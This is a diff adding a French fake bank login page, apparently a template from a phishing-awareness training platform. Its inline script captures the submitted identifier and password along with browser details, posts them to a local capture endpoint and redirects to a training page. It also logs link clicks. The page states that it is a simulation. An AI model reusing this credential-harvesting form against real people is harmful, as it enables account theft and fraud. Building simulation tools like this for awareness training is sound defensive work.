@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portail Bancaire</title>
+    <link rel="stylesheet" href="assets/style.css">
+    <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAEAAAAAAAAAD///8A">
+    <style>
+        body { background: #2d5a27; }
+        .login-btn { background: #2d5a27; }
+        .login-btn:hover { background: #1a24f07; } /* Helper to darken color */
+        input[type="text"]:focus, input[type="password"]:focus { border-color: #2d5a27; }
+        .forgot-link { color: #2d5a27; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo-section">
+                <div class="logo"><span class="logo-emoji">🏦</span>
+                </div>
+                <h1>Connexion sécurisée</h1>
+            </div>
+
+            <form id="loginForm" class="login-form">
+                <div class="form-group">
+                    <label for="email">Identifiant client</label>
+                    <input type="text" id="email" name="email" required autocomplete="username">
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Code secret</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                </div>
+
+                <div class="form-options">
+                    <label class="checkbox-label">
+                        <input type="checkbox" name="remember">
+                        Rester connecté
+                    </label>
+                    <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+                </div>
+
+                <button type="submit" class="login-btn">Se connecter</button>
+            </form>
+
+            <div class="footer-links">
+                <p class="fallback-notice">
+                    Cette page est une simulation. Les données saisies sont collectées à des fins de formation.
+                    Vous serez redirigé après soumission.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+    <script>
+      (function() {
+        console.log('PhishWise tracking activé');
+
+        document.addEventListener('DOMContentLoaded', function() {
+          const forms = document.querySelectorAll('form');
+
+          forms.forEach(function(form) {
+            form.addEventListener('submit', function(e) {
+              e.preventDefault();
+
+              const formData = new FormData(form);
+              const data = {};
+
+              for (let [key, value] of formData.entries()) {
+                data[key] = value;
+              }
+
+              data._campaignId = '686bc7e6d303deb48bba50ac';
+              data._timestamp = new Date().toISOString();
+
+              data._userAgent = navigator.userAgent;
+              data._referrer = document.referrer;
+              data._url = window.location.href;
+
+              fetch('http://localhost:3000/api/phishing/capture', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+              }).then(function() {
+                window.location.href = 'http://localhost:3000/learning/686bc7e6d303deb48bba50ac';
+              }).catch(function(error) {
+                console.error('Erreur lors de l\'envoi des données:', error);
+                setTimeout(function() {
+                  window.location.href = 'http://localhost:3000/learning/686bc7e6d303deb48bba50ac';
+                }, 1000);
+              });
+            });
+          });
+
+          document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' || e.target.closest('a')) {
+              const link = e.target.tagName === 'A' ? e.target : e.target.closest('a');
+
+              // Check if the link's href starts with the base URL of the cloned site
+              // or if it has an onclick handler (which might be the alert we added)
+              // If it's an internal link or our alert link, prevent default navigation.
+              if (link.href && (link.href.startsWith('http://localhost:3000') || link.getAttribute('onclick'))) {
+                  e.preventDefault();
+              }
+
+              fetch('http://localhost:3000/api/phishing/track-click', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  campaignId: '686bc7e6d303deb48bba50ac',
+                  clickedUrl: link.href,
+                  timestamp: new Date().toISOString(),
+                  userAgent: navigator.userAgent
+                })
+              }).catch(console.error);
+            }
+          });
+        });
+      })();
+    </script>
+</body>
+</html>
